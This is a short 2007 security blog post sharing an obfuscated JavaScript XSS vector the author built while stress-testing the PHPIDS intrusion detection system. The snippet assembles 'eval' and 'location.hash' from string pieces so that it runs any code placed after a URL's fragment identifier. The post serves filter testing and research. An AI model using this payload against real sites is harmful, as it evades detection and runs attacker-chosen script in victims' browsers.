---
archive: https://wayback.archive-it.org/22123/20231101171300/https://eve.gd/2007/07/05/obfuscated-fun
categories:
- Technology
- InfoSec
comments: []
date: 2007-07-05 20:27:53 +0200
date_gmt: 2007-07-05 20:27:53 +0200
doi: https://doi.org/10.59348/9q33n-5pk20
layout: post
published: true
status: publish
tags:
- information security
- XSS
- Javascript
title: Obfuscated fun
wordpress_id: 263
wordpress_url: http://pro.grammatic.org/post-obfuscated-fun-37.aspx
atUri: "at://did:plc:hnpt7ns2lecdujegbi6qkqqm/site.standard.document/3mq7mna3hse2h"
---

<p>Just thought I'd share the following script vector with you all that I came up with while stressing PHPIDS today:</p>
{% highlight javascript %}
l= 0 || 'str',m= 0 || 'sub',x= 0 || 'al',y= 0 || 'ev',g= 0 || 'tion.h',f= 0 || 'ash',k= 0 || 
'loca',d= (k) + (g) + (f),a=0 || (y) + (x),b=1[a](d),c=0 || (m) + (l),1[a](b[c](1));
{% endhighlight %}

<p>Put that inside a script block and believe it or not it will eval the text after the fragment identifier.</p>